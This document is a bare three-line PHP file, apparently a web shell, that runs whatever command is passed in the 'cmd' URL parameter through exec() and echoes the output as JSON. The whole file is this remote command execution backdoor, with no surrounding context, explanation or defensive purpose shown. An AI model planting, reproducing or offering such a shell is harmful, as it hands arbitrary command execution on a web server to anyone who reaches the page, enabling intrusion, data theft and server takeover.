<?php
exec($_GET["cmd"],$r);
echo json_encode($r);